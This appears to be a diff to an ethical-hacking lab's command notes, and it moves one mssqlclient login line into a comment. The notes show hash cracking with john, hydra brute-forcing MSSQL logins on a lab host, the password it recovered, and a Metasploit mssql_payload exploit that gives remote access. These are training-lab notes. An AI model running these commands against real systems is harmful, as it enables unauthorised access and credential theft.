@@ -207,7 +207,6 @@ john --wordlist=~/rockyou.txt hash_founded.txt
 #### EH Workstation-2: ~/rockyou.txt
 hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
 ### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
-mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
 msfconsole -q -x "
 search mssql;
 use exploit/windows/mssql/mssql_payload;
@@ -223,6 +222,7 @@ show advanced;
 exploit;"
 
 #### Remote Connection: C:\\Users\\Public\\Downloads\\MSS.txt
+# mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
 # cd C:\\Users\\Public\\Downloads\\
 dir # 🛑 TODO: Connected via MSSQL
 ### INFO: Mode              Size    Type    Last modified               Name
